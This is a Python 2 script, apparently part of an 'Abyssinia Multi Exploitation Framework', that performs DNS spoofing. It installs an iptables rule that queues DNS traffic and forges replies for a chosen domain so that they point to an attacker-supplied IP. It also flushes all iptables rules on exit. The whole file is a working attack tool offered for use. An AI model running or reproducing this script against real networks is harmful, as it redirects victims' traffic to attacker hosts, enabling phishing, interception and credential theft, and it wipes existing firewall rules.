from netfilterqueue import NetfilterQueue
from scapy.all import *
import os


class colors:
    WHITE = '\033[95m'
    BLUE = '\033[94m'
    GREEN = '\033[92m'
    RED = '\033[93m'
    YELLOW = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'

print"  ___  _                   _       _       "
print" / _ \| |                 (_)     (_)      "
print"/ /_\ \ |__  _   _ ___ ___ _ _ __  _  __ _ "
print"|  _  | '_ \| | | / __/ __| | '_ \| |/ _` |"
print"| | | | |_) | |_| \__ \__ \ | | | | | (_| |"
print"\_| |_/_.__/ \__, |___/___/_|_| |_|_|\__,_|"
print"              __/ |                        "
print"             |___/                         \n"

print colors.GREEN + " Abyssinia Multi Exploitation Framework" + colors.ENDC
print colors.YELLOW + "        Ethiopian Cyber sword" + colors.ENDC
print colors.RED + "         Mati Ethiopia 2010" + colors.ENDC
print colors.GREEN + "       Kali Linux Edition"+ colors.ENDC

domain = raw_input('Enter the Domain ')
localIP = raw_input('Enter the IP address of Local Host: ')

os.system('iptables -t nat -A PREROUTING -p udp --dport 53 -j NFQUEUE --queue-num 1')

def callback(packet):
    payload = packet.get_payload()
    pkt = IP(payload)
    
    if not pkt.haslayer(DNSQR):
        packet.accept()
    else:
        if domain in pkt[DNS].qd.qname:
            spoofed_pkt = IP(dst=pkt[IP].src, src=pkt[IP].dst)/\
                          UDP(dport=pkt[UDP].sport, sport=pkt[UDP].dport)/\
                          DNS(id=pkt[DNS].id, qr=1, aa=1, qd=pkt[DNS].qd,\
                          an=DNSRR(rrname=pkt[DNS].qd.qname, ttl=10, rdata=localIP))
            packet.set_payload(str(spoofed_pkt))
            packet.accept()
        else:
            packet.accept()

def main():
    q = NetfilterQueue()
    q.bind(1, callback)
    try:
        q.run() # Main loop
    except KeyboardInterrupt:
        q.unbind()
        os.system('iptables -F')
        os.system('iptables -X')

main()
